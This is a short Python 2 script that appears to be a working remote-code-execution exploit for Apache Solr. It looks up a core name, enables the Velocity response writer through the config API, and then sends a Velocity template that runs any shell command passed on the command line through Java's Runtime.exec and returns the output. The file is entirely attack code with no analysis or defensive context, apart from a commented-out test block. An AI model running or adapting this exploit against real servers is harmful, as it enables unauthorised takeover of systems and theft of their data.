import requests
import re
import json
import sys

def getpath(url):
	newurl = url + 'solr/admin/cores'
	r = requests.get(newurl).text
	r = r.replace(' ','')
	r = r.replace('\n','')
	p = re.findall(r'status":{"(.*?)":{"name',r)
	path = ''.join(p)
	return path

def main(url,cmd):
	newurl = url + 'solr/{}/config'.format(getpath(url))
	headers = {
		'Content-Type': 'application/json',
		}
	payload = {
    	"update-queryresponsewriter": 
    	{
    		"startup": "lazy",
    		"name": "velocity",
    		"class": "solr.VelocityResponseWriter",
    		"template.base.dir": "",
    		"solr.resource.loader.enabled": "true",
    		"params.resource.loader.enabled": "true"
  		}
	}
	res = requests.post(newurl,headers=headers,data=json.dumps(payload))
	
	if res.status_code == 200:
		try:
			p = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('{}'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(cmd)
			target = url + 'solr/' + getpath(url) + p
			result = requests.get(target).content
			return result
		except Exception as e:
			print 'failed'

if __name__ == '__main__':
	print main(sys.argv[1],sys.argv[2])

'''
url = 'http://10.211.55.13:8983/'

print settrue(url)
'''




